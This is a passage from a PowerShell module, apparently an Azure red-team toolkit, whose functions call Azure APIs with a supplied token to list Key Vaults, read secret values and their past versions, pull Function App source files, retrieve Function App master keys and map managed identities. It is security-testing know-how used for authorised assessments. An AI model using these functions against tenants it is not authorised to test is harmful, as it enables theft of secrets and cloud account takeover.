    $AutomationAccountObjects
}

Function Get-AllAzureRMKeyVaults {
    <#
    .SYNOPSIS
        Retrieves all JSON-formatted Key Vaults under a particular subscription using the Azure management API
    
        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None
    
    .DESCRIPTION
        Retrieves all JSON-formatted Key Vaults under a particular subscription using the Azure management API
    
    .PARAMETER Token
        The AzureRM-scoped JWT for the user with the ability to list Key Vaults

    .PARAMETER SubscriptionID
        The unique identifier of the subscription you want to list Key Vaults under
    
    .EXAMPLE
    C:\PS> $KeyVaults = Get-AllAzureRMKeyVaults -Token $Token -SubscriptionID "839df4bc-5ac7-441d-bb5d-26d34bca9ea4"
    
    Description
    -----------
    Uses the JWT in the $Token variable to list all Key Vaults under the subscription with ID starting with "839..." and put them into the $KeyVaults variable
    
    .LINK
        https://learn.microsoft.com/en-us/rest/api/keyvault/keyvault/vaults/list?view=rest-keyvault-keyvault-2022-07-01&tabs=HTTP
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $SubscriptionID
    )

    # Get all Key Vaults under a specified subscription
    $URI = "https://management.azure.com/subscriptions/$($SubscriptionID)/providers/Microsoft.KeyVault/vaults?api-version=2021-10-01"
    $Results = $null
    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.value) {
            $KeyVaultObjects += $Results.value
        }
        $uri = $Results.nextlink
    } until (!($uri))

    $KeyVaultObjects
}

Function Get-AzureRMKeyVaultSecrets {
    <#
    .SYNOPSIS
        Lists available key vault secrets from a specified key vault. Returns IDs of secrets but not the secret itself.

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Lists available key vault secrets from a specified key vault. Returns IDs of secrets but not the secret itself.

    .PARAMETER KeyVaultURL
        The URL of the target Key Vault

    .PARAMETER Token
        The Azure Key Vault service scoped JWT for a principal with the ability to list key vault secrets against the target Key Vault

    .EXAMPLE
        C:\PS> Get-AzureRMKeyVaultSecrets `
            -KeyVaultURL "https://keyvault-01.vault.azure.net" `
            -Token $KVToken

        Description
        -----------
        List the secrets stored in the key vault called keyvault-01

    .INPUTS
        String

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $KeyVaultURL,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token
        
    )

    $URI = "$($KeyVaultURL)/secrets?api-version=7.3" 

    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.value) {
            $KeyVaultSecrets += $Results.value
        } else {
            $KeyVaultSecrets += $Results
        }
        $uri = $Results.'@odata.nextlink'
    } until (!($uri))

    $KeyVaultSecrets
}

Function Get-AzureRMKeyVaultSecretValue {
    <#
    .SYNOPSIS
        Gets the value of a specific Key Vault secret. You can optionally specify a secret version by appending this to the secret ID URL.

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Gets the value of a specific Key Vault secret.

    .PARAMETER KeyVaultSecretID
        The URL of the target Key Vault secret

    .PARAMETER Token
        The Azure Key Vault service scoped JWT for a principal with the ability to read the value of secrets from the specified vault

    .EXAMPLE
        C:\PS> New-AzureRMKeyVaultSecretValue `
            -KeyVaultSecretID "https://keyvault-01.vault.azure.net/secrets/My-secret-value" `
            -Token $Token

        Description
        -----------
        Read the secret value of "My-secret-value" within the "keyvault-01" vault

    .INPUTS
        String

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $KeyVaultSecretID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token
        
    )

    $URI = "$($KeyVaultSecretID)/?api-version=7.0"

    $KeyVaultSecretValue = Invoke-WebRequest `
        -UseBasicParsing `
        -URI $URI `
        -Headers @{
            "Authorization"="Bearer $($Token)"
        } `
        -Method GET

    $KeyVaultSecretValue.Content | ConvertFrom-JSON
}

Function Get-AzureRMKeyVaultSecretVersions {
    <#
    .SYNOPSIS
        Gets all versions of a specified Key Vault secret. You can retrieve historical secrets
        by specifying the historical ID and feeding that to Get-AzureRMKeyVaultSecretValue

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Gets all versions of a specified Key Vault secret. You can retrieve historical secrets
        by specifying the historical ID and feeding that to Get-AzureRMKeyVaultSecretValue

    .PARAMETER KeyVaultSecretID
        The URL of the target Key Vault secret

    .PARAMETER Token
        The Azure Key Vault service scoped JWT for a principal with the ability to read the value of secrets from the specified vault

    .EXAMPLE
        C:\PS> Get-AzureRMKeyVaultSecretVersions `
            -KeyVaultSecretID "https://keyvault-01.vault.azure.net/secrets/My-cool-secret" `
            -Token $Token

        Description
        -----------
        List the versions for the "My-cool-secret" secret within the "keyvault-01" vault

    .INPUTS
        String

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $KeyVaultSecretID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token
        
    )

    $URI = "$($KeyVaultSecretID)/versions?api-version=7.0"

    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.value) {
            $KeyVaultSecretVersions += $Results.value
        } else {
            $KeyVaultSecretVersions += $Results
        }
        $uri = $Results.'@odata.nextlink'
    } until (!($uri))

    $KeyVaultSecretVersions
}

Function Get-AzureRMKeyVaultKeys {
    <#
    .SYNOPSIS
        Lists available key vault keys from a specified key vault. Returns IDs of keys but not the key itself.

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Lists available key vault keys from a specified key vault. Returns IDs of keys but not the key itself.

    .PARAMETER KeyVaultURL
        The URL of the target Key Vault

    .PARAMETER Token
        The Azure Key Vault service scoped JWT for a principal with the ability to list key vault keys against the target Key Vault

    .EXAMPLE
        C:\PS> Get-AzureRMKeyVaultKeys `
            -KeyVaultURL "https://keyvault-01.vault.azure.net" `
            -Token $KVToken

        Description
        -----------
        List the keys stored in the key vault called keyvault-01

    .INPUTS
        String

    .LINK
        https://learn.microsoft.com/en-us/rest/api/keyvault/keys/get-keys/get-keys?view=rest-keyvault-keys-7.4&tabs=HTTP
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $KeyVaultURL,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token
        
    )

    $URI = "$($KeyVaultURL)/keys?api-version=7.4" 

    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.value) {
            $KeyVaultKeys += $Results.value
        } else {
            $KeyVaultKeys += $Results
        }
        $uri = $Results.'@odata.nextlink'
    } until (!($uri))

    $KeyVaultKeys
}

Function Get-AzureRMKeyVaultKeyVersions {
    <#
    .SYNOPSIS
        Gets all versions of a specified Key Vault key.

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Gets all versions of a specified Key Vault key.

    .PARAMETER KeyVaultKeyID
        The URL of the target Key Vault key

    .PARAMETER Token
        The Azure Key Vault service scoped JWT for a principal with the ability to read
        keys from the specified vault

    .EXAMPLE
        C:\PS> Get-AzureRMKeyVaultKeyVersions `
            -KeyVaultKeyID "https://keyvault-01.vault.azure.net/secrets/My-Key" `
            -Token $Token

        Description
        -----------
        List the versions for the "My-Key" key within the "keyvault-01" vault

    .INPUTS
        String

    .LINK
        https://learn.microsoft.com/en-us/rest/api/keyvault/keys/get-key-versions/get-key-versions?view=rest-keyvault-keys-7.4&tabs=HTTP
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $KeyVaultKeyID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token
        
    )

    $URI = "$($KeyVaultKeyID)/versions?api-version=7.0"

    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.value) {
            $KeyVaultKeyVersions += $Results.value
        } else {
            $KeyVaultKeyVersions += $Results
        }
        $uri = $Results.'@odata.nextlink'
    } until (!($uri))

    $KeyVaultKeyVersions
}

Function Get-AzureRMKeyVaultCertificates {
    <#
    .SYNOPSIS
        Lists available key vault certificates from a specified key vault. Returns IDs of certificates but not the certificate itself.

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Lists available key vault certificates from a specified key vault. Returns IDs of certificates but not the certificate itself.

    .PARAMETER KeyVaultURL
        The URL of the target Key Vault

    .PARAMETER Token
        The Azure Key Vault service scoped JWT for a principal with the ability to list key vault certificates against the target Key Vault

    .EXAMPLE
        C:\PS> Get-AzureRMKeyVaultCertificates `
            -KeyVaultURL "https://keyvault-01.vault.azure.net" `
            -Token $KVToken

        Description
        -----------
        List the certificates stored in the key vault called keyvault-01

    .INPUTS
        String

    .LINK
        https://learn.microsoft.com/en-us/rest/api/keyvault/certificates/get-certificates/get-certificates?view=rest-keyvault-certificates-7.4&tabs=HTTP
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $KeyVaultURL,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token
        
    )

    $URI = "$($KeyVaultURL)/certificates?api-version=7.4" 

    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.value) {
            $KeyVaultCertificates += $Results.value
        } else {
            $KeyVaultCertificates += $Results
        }
        $uri = $Results.'@odata.nextlink'
    } until (!($uri))

    $KeyVaultCertificates
}
Function Get-AzureRMKeyVaultCertificatesRevival {
    <#
    .SYNOPSIS
        Lists deleted certificates from a specified key vault and restores a specified certificate.

    .DESCRIPTION
        This function lists deleted certificates from an Azure Key Vault and provides an option to recover a deleted certificate using its name.
        Author: Amal Joy (@h0n3yb4dg3r)

    .PARAMETER KeyVaultURL
        The URL of the target Key Vault.

    .PARAMETER Token
        The Azure Key Vault service scoped JWT for a principal with the ability to list and recover deleted certificates.

    .PARAMETER CertificateName
        The name of the deleted certificate to recover. If not provided, only the list of deleted certificates is displayed.

    .EXAMPLE
        PS> Get-AzureRMKeyVaultCertificatesRevival `
            -KeyVaultURL "https://keyvault-01.vault.azure.net" `
            -Token $KVToken `
            -CertificateName "MyDeletedCert"

        Description
        -----------
        Recovers the deleted certificate named "MyDeletedCert" from the specified Key Vault.

    .INPUTS
        String

    .OUTPUTS
        List of deleted certificates or a success message upon recovery.

    .LINK
        https://learn.microsoft.com/en-us/rest/api/keyvault/certificates/recover-deleted-certificate/recover-deleted-certificate?tabs=HTTP
    #>
    [CmdletBinding()] Param (
        [Parameter(Mandatory = $True)]
        [String]
        $KeyVaultURL,

        [Parameter(Mandatory = $True)]
        [String]
        $Token,

        [Parameter(Mandatory = $False)]
        [String]
        $CertificateName
    )

    $DeletedCertsURI = "$($KeyVaultURL)/deletedcertificates?api-version=7.4"
    $RecoverURIBase = "$($KeyVaultURL)/deletedcertificates"

    $DeletedCertificates = Invoke-RestMethod `
        -Headers @{ Authorization = "Bearer $($Token)" } `
        -URI $DeletedCertsURI `
        -UseBasicParsing `
        -Method "GET" `
        -ContentType "application/json"

    if (-not $CertificateName) {
        return $DeletedCertificates.value
    } else {

        $RecoverURI = "$RecoverURIBase/$CertificateName/recover?api-version=7.4"
        $Response = Invoke-RestMethod `
            -Headers @{ Authorization = "Bearer $($Token)" } `
            -URI $RecoverURI `
            -UseBasicParsing `
            -Method "POST" `
            -ContentType "application/json"

        if ($Response) {
            Write-Output "Certificate '$CertificateName' has been successfully recovered."
        } else {
            Write-Error "Failed to recover the certificate '$CertificateName'."
        }
    }
}
Function Get-AllAzureManagedIdentityAssignments {
    <#
    .SYNOPSIS
        Scans all supported Azure resource types for managed identity assignments
    
        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None
    
    .DESCRIPTION
        Scans all supported Azure resource types for managed identity assignments. Supported resource types
        include Virtual Machines, Logic Apps, Function Apps, ACR Tasks, and Automation Accounts. Depending
        on the resource type, managed identity assignments will include system-assigned, user-assigned, and
        Run As accounts.
    
    .PARAMETER Token
        The AzureRM-scoped JWT for the user with the ability read all of the above-mentioned Azure resource types

    .PARAMETER SubscriptionID
        The unique identifier of the subscription you want to scan for Managed Identity assignments
    
    .EXAMPLE
    C:\PS> $ManagedIdentityAssignments = Get-AllAzureManagedIdentityAssignments `
        -Token $Token `
        -SubscriptionID "839df4bc-5ac7-441d-bb5d-26d34bca9ea4"
    
    Description
    -----------
    Uses the JWT in the $Token variable to scan the "839..." subscription for all Azure resources with managed identity assignments
    
    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $SubscriptionID
    )

    # Get all VMs
    $VirtualMachines = Get-AllAzureRMVirtualMachines -Token $Token -SubscriptionID $SubscriptionID

    # Get all Logic Apps
    $LogicApps = Get-AllAzureRMLogicApps -Token $Token -SubscriptionID $SubscriptionID

    # Get all Function Apps
    $FunctionApps = Get-AllAzureRMFunctionApps -Token $Token -SubscriptionID $SubscriptionID

    # Get all ACRs
    $ContainerRegistries = Get-AllAzureRMAzureContainerRegistries -Token $Token -SubscriptionID $SubscriptionID

    # Get all Automation Accounts
    $AutomationAccounts = Get-AllAzureRMAutomationAccounts -Token $Token -SubscriptionID $SubscriptionID

    # Process Virtual Machines
    $VirtualMachines | %{
        $VM = $_
    
        # Output an object if there is a system-assigned managed identity:
        If ($VM.identity.principalId -eq $null) {
        } else {
    
            $ManagedIdentityAssignment = New-Object PSObject -Property @{
                ResourceType        = "Virtual Machine"
                ManagedIdentityType = "System Assigned"
                ResourceName        = $VM.name
                ResourceID          = $VM.id
                ServicePrincipalID  = $VM.identity.principalId
            }
    
            $ManagedIdentityAssignment
    
        }
    
        # Virtual Machines can have multiple user-assigned managed identity assignments.
        # Output one object per user-assigned managed identity:
        If ($VM.identity.userAssignedIdentities -eq $null) {
        } else {
            # Count how many user-assigned identities there are:
            $UserAssignedIdentityCount = ($VM.identity.userAssignedIdentities.PSObject.Properties | measure).Count
    
            # Loop through the VM object for the number of user assigned identities there are:
            1..$UserAssignedIdentityCount | %{
                $CurrentInteger = $_
    
                $ManagedIdentityAssignment = New-Object PSObject -Property @{
                    ResourceType        = "Virtual Machine"
                    ManagedIdentityType = "User Assigned"
                    ResourceName        = $VM.name
                    ResourceID          = $VM.id
                    ServicePrincipalID  = ($VirtualMachines.identity.userAssignedIdentities.PSObject.Properties | Select-Object -First $CurrentInteger | Select-Object -Last 1 | select -expand Value).principalId
                }
    
            $ManagedIdentityAssignment
    
            }
        }
    }
    
    # Process Logic Apps
    $LogicApps | %{
        $LogicApp = $_
    
        # Output an object if there is a system-assigned managed identity:
        If ($LogicApp.identity.principalId -eq $null) {
        } else {
    
            $ManagedIdentityAssignment = New-Object PSObject -Property @{
                ResourceType        = "Logic App"
                ManagedIdentityType = "System Assigned"
                ResourceName        = $LogicApp.name
                ResourceID          = $LogicApp.id
                ServicePrincipalID  = $LogicApp.identity.principalId
            }
    
            $ManagedIdentityAssignment
    
        }
    
        # Logic Apps can only have one managed identity assignment at a time
        # Output an if there is a user-assigned managed identity:
        If ($LogicApp.identity.userAssignedIdentities -eq $null) {
        } else {
            $ManagedIdentityAssignment = New-Object PSObject -Property @{
                ResourceType        = "Logic App"
                ManagedIdentityType = "User Assigned"
                ResourceName        = $LogicApp.name
                ResourceID          = $LogicApp.id
                ServicePrincipalID  = ($LogicApp.identity.userAssignedIdentities.PSObject.Properties | select -expand Value).principalId
            }
    
            $ManagedIdentityAssignment
    
        }
    }
    
    # Process Function Apps
    $FunctionApps | %{
        $FunctionApp = $_
    
        # Output an object if there is a system-assigned managed identity:
        If ($FunctionApp.identity.principalId -eq $null) {
        } else {
    
            $ManagedIdentityAssignment = New-Object PSObject -Property @{
                ResourceType        = "Function App"
                ManagedIdentityType = "System Assigned"
                ResourceName        = $FunctionApp.name
                ResourceID          = $FunctionApp.id
                ServicePrincipalID  = $FunctionApp.identity.principalId
            }
    
            $ManagedIdentityAssignment
    
        }
    
        # Function Apps can have multiple user-assigned managed identity assignments.
        # Output one object per user-assigned managed identity:
        If ($FunctionApp.identity.userAssignedIdentities -eq $null) {
        } else {
            # Count how many user-assigned identities there are:
            $UserAssignedIdentityCount = ($FunctionApp.identity.userAssignedIdentities.PSObject.Properties | measure).Count
    
            # Loop through the FunctionApp object for the number of user assigned identities there are:
            1..$UserAssignedIdentityCount | %{
                $CurrentInteger = $_
    
                $ManagedIdentityAssignment = New-Object PSObject -Property @{
                    ResourceType        = "Function App"
                    ManagedIdentityType = "User Assigned"
                    ResourceName        = $FunctionApp.name
                    ResourceID          = $FunctionApp.id
                    ServicePrincipalID  = ($FunctionApps.identity.userAssignedIdentities.PSObject.Properties | Select-Object -First $CurrentInteger | Select-Object -Last 1 | select -expand Value).principalId
            }
    
            $ManagedIdentityAssignment
    
            }
        }
    }
    
    # Process Container Registries
    $ContainerRegistries | %{
        $ContainerRegistry = $_
    
        # The original CR object doesn't contain MI assignments, we need to make another API request per CR to get those:
        $ContainerRegistryManagedIdentities = (
            Invoke-WebRequest -UseBasicParsing -Uri "https://management.azure.com/api/invoke" `
                -Headers @{
                    "Authorization"="Bearer $($Token)"
                    "x-ms-path-query"="$($ContainerRegistry.id)?api-version=2020-11-01-preview"
                } `
                -ContentType "application/json"
        ).Content | ConvertFrom-JSON
    
        # Output an object if there is a system-assigned managed identity:
        If ($ContainerRegistryManagedIdentities.identity.principalId -eq $null) {
        } else {
    
            $ManagedIdentityAssignment = New-Object PSObject -Property @{
                ResourceType        = "Container Registry"
                ManagedIdentityType = "System Assigned"
                ResourceName        = $ContainerRegistry.name
                ResourceID          = $ContainerRegistry.id
                ServicePrincipalID  = $ContainerRegistryManagedIdentities.identity.principalId
            }
    
            $ManagedIdentityAssignment
    
        }
    
        # Container Registries can have multiple user-assigned managed identity assignments.
        # Output one object per user-assigned managed identity:
        If ($ContainerRegistryManagedIdentities.identity.userAssignedIdentities -eq $null) {
        } else {
            # Count how many user-assigned identities there are:
            $UserAssignedIdentityCount = ($ContainerRegistryManagedIdentities.identity.userAssignedIdentities.PSObject.Properties | measure).Count
    
            # Loop through the ContainerRegistryManagedIdentities object for the number of user assigned identities there are:
            1..$UserAssignedIdentityCount | %{
                $CurrentInteger = $_
    
                $ManagedIdentityAssignment = New-Object PSObject -Property @{
                    ResourceType        = "Container Registry"
                    ManagedIdentityType = "User Assigned"
                    ResourceName        = $ContainerRegistry.name
                    ResourceID          = $ContainerRegistry.id
                    ServicePrincipalID  = ($ContainerRegistryManagedIdentities.identity.userAssignedIdentities.PSObject.Properties | Select-Object -First $CurrentInteger | Select-Object -Last 1 | select -expand Value).principalId
            }
    
            $ManagedIdentityAssignment
    
            }
        }
    }
    
    # Process Automation Accounts
    $AutomationAccounts | %{
        $AutomationAccount = $_
    
        # Output an object if there is a system-assigned managed identity:
        If ($AutomationAccount.identity.principalId -eq $null) {
        } else {
    
            $ManagedIdentityAssignment = New-Object PSObject -Property @{
                ResourceType        = "Automation Account"
                ManagedIdentityType = "System Assigned"
                ResourceName        = $AutomationAccount.name
                ResourceID          = $AutomationAccount.id
                ServicePrincipalID  = $AutomationAccount.identity.principalId
            }
    
            $ManagedIdentityAssignment
    
        }
    
        # Automation Accounts can have multiple user-assigned managed identity assignments.
        # Output one object per user-assigned managed identity:
        If ($AutomationAccount.identity.userAssignedIdentities -eq $null) {
        } else {
            # Count how many user-assigned identities there are:
            $UserAssignedIdentityCount = ($AutomationAccount.identity.userAssignedIdentities.PSObject.Properties | measure).Count
    
            # Loop through the AutomationAccount object for the number of user assigned identities there are:
            1..$UserAssignedIdentityCount | %{
                $CurrentInteger = $_
    
                $ManagedIdentityAssignment = New-Object PSObject -Property @{
                    ResourceType        = "Automation Account"
                    ManagedIdentityType = "User Assigned"
                    ResourceName        = $AutomationAccount.name
                    ResourceID          = $AutomationAccount.id
                    ServicePrincipalID  = ($AutomationAccount.identity.userAssignedIdentities.PSObject.Properties | Select-Object -First $CurrentInteger | Select-Object -Last 1 | select -expand Value).principalId
            }
    
            $ManagedIdentityAssignment
    
            }
        }
    }
}

Function Get-AzureFunctionAppFunctions {
    <#
    .SYNOPSIS
        Retrieves all JSON-formatted Azure RM Function App functions under a particular function app
    
        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None
    
    .DESCRIPTION
        Retrieves all JSON-formatted Azure RM Function App functions under a particular function app
    
    .PARAMETER Token
        The AzureRM-scoped JWT for the user with the ability to list Function App functions

    .PARAMETER PathToFunctionApp
        The full URL path to the function app

    .EXAMPLE
        Get-AzureFunctionAppFunctions `
            -Token $ARMToken `
            -PathToFunctionApp "https://management.azure.com/subscriptions/f5e4c53c-7ff4-41ec-ad4a-00f512eb2dcf/resourceGroups/BHE_SpecterDev_FA_RG/providers/Microsoft.Web/sites/MyCoolFunctionApp"

        Retrieve the list of functions under the specified function app

    .LINK
        https://medium.com/p/300065251cbe

    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $PathToFunctionApp
    )

    # Get the functions for the specified Function App
    $Request = Invoke-WebRequest -URI "$($PathToFunctionApp)/functions?api-version=2018-11-01" `
        -Method "GET" `
        -Headers @{
            "Authorization"="Bearer $($Token)"
        } 
        
        $FunctionAppFunctions = ($Request.Content | ConvertFrom-JSON).value

    $FunctionAppFunctions
}

Function Get-AzureFunctionAppFunctionFile {
    <#
    .SYNOPSIS
        Retrieves the raw file (usually source code) of a function app function
    
        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None
    
    .DESCRIPTION
        Retrieves the raw file (usually source code) of a function app function
    
    .PARAMETER Token
        The AzureRM-scoped JWT for the user with the ability to list Function App functions

    .PARAMETER PathToFunctionApp
        The full URL path to the function app

    .PARAMETER FileName
        The name of the file in the function app to retrieve, "run.ps1" for example

    .EXAMPLE
        Get-AzureFunctionAppFunctionFile `
            -Token $ARMToken `
            -PathToFunctionApp "https://management.azure.com/subscriptions/f5e4c53c-7ff4-41ec-ad4a-00f512eb2dcf/resourceGroups/BHE_SpecterDev_FA_RG/providers/Microsoft.Web/sites/MyCoolFunctionApp" `
            -Function "HttpTrigger1" `
            -FileName "run.ps1"

        Retrieve the "run.ps1" file associated with the specified function app function
    .LINK
        https://medium.com/p/300065251cbe

    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $PathToFunctionApp,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $FunctionName,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $FileName
    )

    # Get the file from the specified Function App
    $Request = Invoke-WebRequest -URI "$($PathToFunctionApp)/hostruntime/admin/vfs//$($FunctionName)/$($FileName)?relativePath=1&api-version=2018-11-01" `
        -Method "GET" `
        -Headers @{
            "Authorization"="Bearer $($Token)"
        } 
        
        $FunctionAppFile = [System.Text.Encoding]::UTF8.GetString($Request.Content)

    $FunctionAppFile
}

Function Get-AzureFunctionAppMasterKeys {
    <#
    .SYNOPSIS
        Retrieves all JSON-formatted Azure RM Function App objects under a particular subscription using the Azure management API
    
        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None
    
    .DESCRIPTION
        Retrieves all JSON-formatted Azure RM Function App objects under a particular subscription using the Azure management API
    
    .PARAMETER Token
        The AzureRM-scoped JWT for the user with the ability to list Function App master keys

    .PARAMETER PathToFunctionApp
        The full URL path to the function app

    .EXAMPLE
        Get-AzureFunctionAppMasterKeys `
            -Token $ARMToken `
            -PathToFunctionApp "https://management.azure.com/subscriptions/f5e4c53c-7ff4-41ec-ad4a-00f512eb2dcf/resourceGroups/BHE_SpecterDev_FA_RG/providers/Microsoft.Web/sites/MyCoolFunctionApp"

        Retrieve the master key for "MyCoolFunctionApp"

    .LINK
        https://medium.com/p/300065251cbe

    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $PathToFunctionApp
    )

    # Get the Master Key for the specified Function App
    $Request = Invoke-WebRequest -URI "$($PathToFunctionApp)/host/default/listkeys?api-version=2018-11-01" `
        -Method "POST" `
        -Headers @{
            "Authorization"="Bearer $($Token)"
        } 
        
        $FunctionAppMasterKey = ($Request.Content | ConvertFrom-JSON).masterKey

    $FunctionAppMasterKey
}

Function Get-AzureFunctionOutput {
    <#
    .SYNOPSIS
        Retrieves the output of a specified Function App function
    
        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None
    
    .DESCRIPTION
        Retrieves the output of a specified Function App function
    
    .PARAMETER FunctionKey
        The function-specific key or function app master key

    .PARAMETER FunctionURL
        The full URL path to the function app function

    .EXAMPLE
        Get-AzureFunctionOutput `
            -FunctionKey $FunctionAppMasterKey `
            -PathToFunctionApp "https://management.azure.com/subscriptions/f5e4c53c-7ff4-41ec-ad4a-00f512eb2dcf/resourceGroups/BHE_SpecterDev_FA_RG/providers/Microsoft.Web/sites/MyCoolFunctionApp"

        Trigger and get output from MyCoolFunctionApp

    .LINK
        https://medium.com/p/300065251cbe
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $FunctionKey,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $FunctionURL
    )

    # Get the Master Key for the specified Function App
    $Request = Invoke-WebRequest -URI "$($FunctionURL)?code=$($FunctionKey)" `
        -Method "GET"

    $Request.Content
}

Function Get-AzureRMWebApp {
    <#
    .SYNOPSIS
        Retrieves the specified JSON-formatted Azure App Service web app
    
        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None
    
    .DESCRIPTION
        Retrieves the specified JSON-formatted Azure App Service web app
    
    .PARAMETER Token
        The AzureRM-scoped JWT for the user with the ability to retrieve the web app

    .PARAMETER WebAppID
        The unique identifier of the web app you want to fetch
    
    .EXAMPLE
    C:\PS> $WebApp = Get-AzureRMWebApp -Token $Token -WebAppID "/subscriptions/6da4e9d4-c2bc-42a7-b5e3-f2f905db4a34/resourceGroups/WebApps/providers/Microsoft.Web/sites/MyCoolWebApp"
    
    
    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $WebAppID
    )

    # Get the specified Azure App Service web app
    $URI = "https://management.azure.com/$($WebAppID)?api-version=2022-03-01"

    $WebAppObject = Invoke-RestMethod `
        -Headers @{
            Authorization = "Bearer $($Token)"
        } `
        -URI $URI `
        -UseBasicParsing `
